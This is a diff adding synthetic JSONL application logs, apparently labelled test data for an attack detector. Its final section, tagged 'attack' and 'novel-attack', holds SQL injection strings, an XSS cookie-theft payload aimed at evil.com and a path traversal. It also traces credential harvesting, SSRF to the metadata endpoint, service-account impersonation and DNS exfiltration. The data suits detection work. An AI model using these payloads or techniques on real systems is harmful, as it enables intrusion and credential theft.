@@ -1,0 +1,96 @@
+{"ts":"2026-01-08T03:00:01Z","level":"info","msg":"Pod payment-service-7b9f4d6c8-x2vnq scheduled on node gke-prod-pool-1-abc123","component":"scheduler","cluster":"prod-us-east1"}
+{"ts":"2026-01-08T03:00:02Z","level":"info","msg":"Container runtime: containerd pulled image gcr.io/myproject/payment:v2.3.1 in 2.3s","node":"gke-prod-pool-1-abc123","image_size_mb":245}
+{"ts":"2026-01-08T03:00:03Z","level":"info","msg":"Readiness probe succeeded for payment-service-7b9f4d6c8-x2vnq","probe":"http-get http://:8080/healthz","latency_ms":12}
+{"ts":"2026-01-08T03:00:04Z","level":"info","msg":"Liveness probe succeeded for order-service-5c8d7f9a2-m3kpl","probe":"tcp-connect :8080","latency_ms":2}
+{"ts":"2026-01-08T03:00:05Z","level":"info","msg":"HorizontalPodAutoscaler scaled deployment/api-gateway from 3 to 5 replicas","reason":"cpu above target","cpu_percent":78}
+{"ts":"2026-01-08T03:00:10Z","level":"info","msg":"PostgreSQL connection pool initialized: 20 connections to prod-db-primary.us-east1-b.c.myproject.internal:5432","service":"order-service","pool_size":20}
+{"ts":"2026-01-08T03:00:11Z","level":"debug","msg":"Query executed in 12ms: SELECT * FROM orders WHERE user_id = $1 AND status = $2 LIMIT 100","rows_affected":47,"query_id":"q-abc123"}
+{"ts":"2026-01-08T03:00:12Z","level":"debug","msg":"Query executed in 8ms: SELECT id, name, email FROM users WHERE id = $1","rows_affected":1,"query_id":"q-def456"}
+{"ts":"2026-01-08T03:00:13Z","level":"info","msg":"Database replica lag within threshold: 45ms","primary":"prod-db-primary","replica":"prod-db-replica-1"}
+{"ts":"2026-01-08T03:00:14Z","level":"debug","msg":"Prepared statement cached: ps_get_user_orders, hit rate: 94.2%","cache_size":128}
+{"ts":"2026-01-08T03:00:20Z","level":"info","msg":"Kafka consumer group order-processors rebalanced: assigned partitions [0,1,2,3] on topic order-events","consumer_id":"order-processor-1","group_generation":42}
+{"ts":"2026-01-08T03:00:21Z","level":"info","msg":"Published 150 messages to SNS topic arn:aws:sns:us-east-1:123456789:order-notifications in 45ms","batch_size":150,"topic":"order-notifications"}
+{"ts":"2026-01-08T03:00:22Z","level":"debug","msg":"Kafka offset committed: topic=order-events, partition=2, offset=1847293","consumer_id":"order-processor-1"}
+{"ts":"2026-01-08T03:00:23Z","level":"info","msg":"SQS queue orders-dlq depth: 3 messages, oldest: 2h 15m","queue":"orders-dlq","alarm_threshold":100}
+{"ts":"2026-01-08T03:00:24Z","level":"info","msg":"EventBridge rule payment-processor triggered: 847 invocations in last hour","rule":"payment-processor","success_rate":99.8}
+{"ts":"2026-01-08T03:00:30Z","level":"info","msg":"Redis cluster connected: 3 masters, 3 replicas at redis-prod.cache.amazonaws.com:6379","latency_ms":2,"cluster_state":"ok"}
+{"ts":"2026-01-08T03:00:31Z","level":"debug","msg":"Cache hit for key user:profile:u-789xyz, TTL remaining: 3542s","size_bytes":2048,"cache":"redis"}
+{"ts":"2026-01-08T03:00:32Z","level":"debug","msg":"Cache miss for key product:inventory:p-456abc, fetching from source","cache":"redis","source":"inventory-service"}
+{"ts":"2026-01-08T03:00:33Z","level":"info","msg":"Memcached pool health check passed: 8/8 nodes responsive","pool":"session-cache","avg_latency_ms":1.2}
+{"ts":"2026-01-08T03:00:34Z","level":"debug","msg":"Cache eviction: 1247 keys removed due to memory pressure","cache":"redis","memory_used_percent":85}
+{"ts":"2026-01-08T03:00:40Z","level":"info","msg":"POST /api/v2/orders completed: 201 Created in 89ms","trace_id":"abc123def456","user_id":"u-789xyz","method":"POST","path":"/api/v2/orders"}
+{"ts":"2026-01-08T03:00:41Z","level":"info","msg":"GET /api/v2/users/u-789xyz completed: 200 OK in 23ms","trace_id":"def456ghi789","user_id":"u-789xyz","method":"GET"}
+{"ts":"2026-01-08T03:00:42Z","level":"info","msg":"GraphQL query UserProfile resolved in 23ms, complexity score: 45","operation":"GetUserDashboard","user_id":"u-789xyz"}
+{"ts":"2026-01-08T03:00:43Z","level":"info","msg":"GraphQL mutation CreateOrder resolved in 156ms, complexity score: 12","operation":"CreateOrder","order_id":"ord-2026-00142"}
+{"ts":"2026-01-08T03:00:44Z","level":"debug","msg":"Rate limit check passed: user u-789xyz at 45/1000 requests per minute","rate_limiter":"token-bucket"}
+{"ts":"2026-01-08T03:00:50Z","level":"info","msg":"OAuth2 token refreshed for service-account payment-gateway-sa, expires in 3600s","issuer":"https://accounts.google.com","service":"payment-gateway"}
+{"ts":"2026-01-08T03:00:51Z","level":"info","msg":"User u-789xyz authenticated via SSO, session created with 24h expiry","provider":"okta","mfa":"totp"}
+{"ts":"2026-01-08T03:00:52Z","level":"info","msg":"JWT token validated: sub=u-789xyz, iss=auth.mycompany.com, exp=2026-01-08T04:00:00Z","token_type":"access"}
+{"ts":"2026-01-08T03:00:53Z","level":"debug","msg":"Session extended for user u-123abc, new expiry: 2026-01-08T15:00:00Z","session_id":"sess-xyz789"}
+{"ts":"2026-01-08T03:00:54Z","level":"info","msg":"API key validated for service integration-partner-1, scopes: [read:orders, write:webhooks]","key_prefix":"sk_live_..."}
+{"ts":"2026-01-08T03:01:00Z","level":"info","msg":"Cron job daily-report-generator started, last run: 2026-01-07T03:01:00Z","job_id":"cron-daily-001","schedule":"0 3 * * *"}
+{"ts":"2026-01-08T03:01:01Z","level":"info","msg":"Batch job nightly-reconciliation processing 45,230 records","job":"nightly-reconciliation","batch_id":"batch-20260108"}
+{"ts":"2026-01-08T03:01:30Z","level":"info","msg":"Batch job completed: processed 45,230 records in 28.4s, 0 failures","job":"nightly-reconciliation","throughput":1593}
+{"ts":"2026-01-08T03:01:31Z","level":"info","msg":"Scheduled task inventory-sync completed successfully","task":"inventory-sync","items_synced":12847}
+{"ts":"2026-01-08T03:01:32Z","level":"info","msg":"Dead letter queue processor cleared 3 messages after manual review","queue":"orders-dlq","action":"reprocessed"}
+{"ts":"2026-01-08T03:02:00Z","level":"info","msg":"TLS certificate for api.mycompany.com valid for 89 days","issuer":"Let's Encrypt","expiry":"2026-04-07"}
+{"ts":"2026-01-08T03:02:01Z","level":"info","msg":"Secret rotation completed for database credentials","secret":"prod/db/credentials","version":47}
+{"ts":"2026-01-08T03:02:02Z","level":"info","msg":"Vault token renewed, new TTL: 24h","vault_addr":"https://vault.mycompany.com:8200"}
+{"ts":"2026-01-08T03:02:03Z","level":"debug","msg":"AWS STS AssumeRole succeeded for cross-account access","role":"arn:aws:iam::987654321:role/DataPipelineRole","duration":3600}
+{"ts":"2026-01-08T03:02:04Z","level":"info","msg":"KMS key rotation initiated for alias/app-encryption-key","key_id":"mrk-abc123","region":"us-east-1"}
+{"ts":"2026-01-08T03:03:00Z","level":"info","msg":"Prometheus scrape completed: 1,247 metrics collected in 234ms","target":"payment-service:9090","job":"kubernetes-pods"}
+{"ts":"2026-01-08T03:03:01Z","level":"info","msg":"Datadog agent forwarded 8,432 metrics to intake","agent_version":"7.45.0","host":"gke-prod-pool-1-abc123"}
+{"ts":"2026-01-08T03:03:02Z","level":"debug","msg":"Trace span completed: order-service.createOrder, duration: 156ms","trace_id":"abc123def456","span_id":"span-789"}
+{"ts":"2026-01-08T03:03:03Z","level":"info","msg":"Log aggregator buffer flushed: 5,234 events sent to Elasticsearch","buffer_size":5234,"target":"logs-2026.01.08"}
+{"ts":"2026-01-08T03:03:04Z","level":"info","msg":"Health check endpoint /healthz returned 200 OK","service":"api-gateway","check_type":"liveness"}
+{"ts":"2026-01-08T03:04:00Z","level":"info","msg":"Istio sidecar proxy synced configuration, version: 2026-01-08T03:00:00Z","proxy":"envoy","config_version":"v1.18.3"}
+{"ts":"2026-01-08T03:04:01Z","level":"debug","msg":"Circuit breaker status: payment-gateway-cb CLOSED, failure rate: 0.2%","circuit_breaker":"payment-gateway-cb","state":"closed"}
+{"ts":"2026-01-08T03:04:02Z","level":"info","msg":"Service mesh mTLS handshake succeeded between order-service and payment-service","src":"order-service","dst":"payment-service"}
+{"ts":"2026-01-08T03:04:03Z","level":"debug","msg":"Load balancer health check passed for backend pool api-gateway-pool","healthy_backends":5,"total_backends":5}
+{"ts":"2026-01-08T03:04:04Z","level":"info","msg":"CDN cache purge completed for path /static/js/*","cdn":"cloudflare","purge_id":"purge-xyz789"}
+{"ts":"2026-01-08T03:05:00Z","level":"warn","msg":"Memory usage above 80% threshold on node gke-prod-pool-1-abc123","current_percent":82,"threshold":80}
+{"ts":"2026-01-08T03:05:01Z","level":"warn","msg":"Slow query detected: 2.3s for SELECT with full table scan on orders","query_id":"q-slow-001","table":"orders"}
+{"ts":"2026-01-08T03:05:02Z","level":"warn","msg":"Connection pool near capacity: 18/20 connections in use","service":"order-service","pool":"postgres"}
+{"ts":"2026-01-08T03:05:03Z","level":"warn","msg":"Request latency P99 above SLO: 450ms (target: 300ms)","service":"payment-service","window":"5m"}
+{"ts":"2026-01-08T03:05:04Z","level":"warn","msg":"Disk usage at 75% on persistent volume pvc-storage-001","mount":"/data","size_gb":500}
+{"ts":"2026-01-08T03:06:00Z","level":"error","msg":"Failed login attempt for user admin@mycompany.com: invalid password","ip":"203.0.113.42","attempts":1}
+{"ts":"2026-01-08T03:06:01Z","level":"error","msg":"Payment declined by gateway: insufficient funds","order_id":"ord-2026-00143","gateway":"stripe","error_code":"card_declined"}
+{"ts":"2026-01-08T03:06:02Z","level":"error","msg":"Email delivery failed: recipient mailbox full","recipient":"user@example.com","provider":"sendgrid","error":"550 5.2.2"}
+{"ts":"2026-01-08T03:06:03Z","level":"error","msg":"Webhook delivery failed after 3 retries: connection timeout","webhook_id":"wh-abc123","target":"https://partner.com/webhooks"}
+{"ts":"2026-01-08T03:06:04Z","level":"error","msg":"S3 upload failed: access denied for bucket prod-backups","bucket":"prod-backups","key":"backup-20260108.tar.gz"}
+{"ts":"2026-01-08T03:07:00Z","level":"info","msg":"Feature flag dark-mode-v2 evaluated: enabled for 15% of users","flag":"dark-mode-v2","variant":"treatment","user_bucket":7}
+{"ts":"2026-01-08T03:07:01Z","level":"info","msg":"A/B test checkout-flow-v3 assigned user to control group","experiment":"checkout-flow-v3","group":"control","user_id":"u-789xyz"}
+{"ts":"2026-01-08T03:07:02Z","level":"debug","msg":"Configuration hot-reload triggered by ConfigMap change","config":"app-settings","version":"cm-v47"}
+{"ts":"2026-01-08T03:07:03Z","level":"info","msg":"Graceful shutdown initiated, draining 23 active connections","signal":"SIGTERM","drain_timeout_s":30}
+{"ts":"2026-01-08T03:07:04Z","level":"info","msg":"Rolling update in progress: 3/5 replicas updated for deployment/api-gateway","strategy":"RollingUpdate","max_unavailable":1}
+{"ts":"2026-01-08T03:08:00Z","level":"info","msg":"GCP Cloud Function payment-webhook-handler invoked, execution time: 234ms","function":"payment-webhook-handler","memory_mb":256}
+{"ts":"2026-01-08T03:08:01Z","level":"info","msg":"AWS Lambda order-processor cold start: 1.2s, billed duration: 1.4s","function":"order-processor","memory_mb":512}
+{"ts":"2026-01-08T03:08:02Z","level":"debug","msg":"Step Function execution started: OrderProcessingWorkflow","execution_arn":"arn:aws:states:us-east-1:123456789:execution:OrderProcessingWorkflow:exec-001"}
+{"ts":"2026-01-08T03:08:03Z","level":"info","msg":"Pub/Sub message acknowledged: projects/myproject/subscriptions/order-events-sub","message_id":"msg-abc123","ack_latency_ms":12}
+{"ts":"2026-01-08T03:08:04Z","level":"info","msg":"Cloud Tasks queue orders-queue processed 847 tasks in last hour","queue":"orders-queue","success_rate":99.9}
+{"ts":"2026-01-08T03:09:00Z","level":"info","msg":"gRPC call completed: OrderService.CreateOrder in 45ms","method":"CreateOrder","status":"OK","peer":"10.0.1.42:8080"}
+{"ts":"2026-01-08T03:09:01Z","level":"info","msg":"WebSocket connection established: user u-789xyz on channel notifications","channel":"notifications","connections":1247}
+{"ts":"2026-01-08T03:09:02Z","level":"debug","msg":"HTTP/2 stream opened: stream_id=15, window_size=65535","connection_id":"conn-xyz789"}
+{"ts":"2026-01-08T03:09:03Z","level":"info","msg":"Server-Sent Events subscription started for user u-789xyz","event_type":"order-updates","subscriber_count":342}
+{"ts":"2026-01-08T03:09:04Z","level":"debug","msg":"Keep-alive ping sent to 1,247 WebSocket connections","latency_avg_ms":2.3}
+{"ts":"2026-01-08T04:00:00Z","level":"error","msg":"Query failed: SELECT * FROM users WHERE id = 1 OR 1=1; DROP TABLE users;--","source":"api-gateway","category":"attack"}
+{"ts":"2026-01-08T04:00:01Z","level":"error","msg":"Invalid SQL: UNION SELECT username, password FROM admin_users","source":"order-service","category":"attack"}
+{"ts":"2026-01-08T04:00:02Z","level":"warn","msg":"Sanitization blocked input: <script>document.location=\"http://evil.com/steal?c=\"+document.cookie</script>","field":"comment","category":"attack"}
+{"ts":"2026-01-08T04:00:03Z","level":"error","msg":"File access denied: ../../../etc/passwd","source":"file-service","category":"attack"}
+{"ts":"2026-01-08T04:30:00Z","level":"info","msg":"Module lodash-utils loaded, initializing runtime hooks","pid":12847,"source":"node-loader","category":"novel-attack"}
+{"ts":"2026-01-08T04:30:01Z","level":"debug","msg":"Environment scan complete: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, DATABASE_URL found","module":"lodash-utils","category":"novel-attack"}
+{"ts":"2026-01-08T04:30:02Z","level":"info","msg":"Outbound connection established to telemetry.analytics-cdn.net:443","module":"lodash-utils","bytes_sent":4096,"category":"novel-attack"}
+{"ts":"2026-01-08T04:31:00Z","level":"info","msg":"Legacy auth endpoint /v1/oauth/token invoked, client_id: mobile-app-2019","source":"auth-service","category":"novel-attack"}
+{"ts":"2026-01-08T04:31:00Z","level":"info","msg":"Legacy auth endpoint /v1/oauth/token invoked, client_id: mobile-app-2019","source":"auth-service","category":"novel-attack"}
+{"ts":"2026-01-08T04:31:01Z","level":"info","msg":"Legacy auth endpoint /v1/oauth/token invoked, client_id: mobile-app-2019","source":"auth-service","category":"novel-attack"}
+{"ts":"2026-01-08T04:31:01Z","level":"debug","msg":"Rate limiter bypassed: client in legacy_whitelist","client_id":"mobile-app-2019","category":"novel-attack"}
+{"ts":"2026-01-08T04:32:00Z","level":"info","msg":"Process spawned: /bin/sh -c cat /proc/1/cgroup","container":"payment-service-7b9f4d6c8-x2vnq","uid":1000,"category":"novel-attack"}
+{"ts":"2026-01-08T04:32:01Z","level":"debug","msg":"File read: /var/run/secrets/kubernetes.io/serviceaccount/token","container":"payment-service-7b9f4d6c8-x2vnq","category":"novel-attack"}
+{"ts":"2026-01-08T04:32:02Z","level":"info","msg":"Mount operation: /host/var/log -> /mnt/host-logs, flags=ro","container":"payment-service-7b9f4d6c8-x2vnq","category":"novel-attack"}
+{"ts":"2026-01-08T04:33:00Z","level":"info","msg":"PDF generation started for invoice INV-2026-00142","service":"pdf-generator","category":"novel-attack"}
+{"ts":"2026-01-08T04:33:01Z","level":"debug","msg":"Fetching resource: http://169.254.169.254/latest/meta-data/iam/security-credentials/","service":"pdf-generator","category":"novel-attack"}
+{"ts":"2026-01-08T04:33:02Z","level":"info","msg":"External resource loaded: 4821 bytes from metadata endpoint","service":"pdf-generator","category":"novel-attack"}
+{"ts":"2026-01-08T04:34:00Z","level":"info","msg":"Service account payment-processor-sa requested role binding for roles/storage.admin","source":"iam-audit","category":"novel-attack"}
+{"ts":"2026-01-08T04:34:01Z","level":"info","msg":"Token exchange completed: payment-processor-sa -> impersonated admin@myproject.iam.gserviceaccount.com","source":"iam-audit","category":"novel-attack"}
+{"ts":"2026-01-08T04:35:00Z","level":"debug","msg":"DNS query: dXNlcm5hbWU9YWRtaW4=.data.attacker-domain.com","resolver":"kube-dns","type":"TXT","category":"novel-attack"}
+{"ts":"2026-01-08T04:35:01Z","level":"debug","msg":"DNS query: cGFzc3dvcmQ9czNjcjN0.data.attacker-domain.com","resolver":"kube-dns","type":"TXT","category":"novel-attack"}
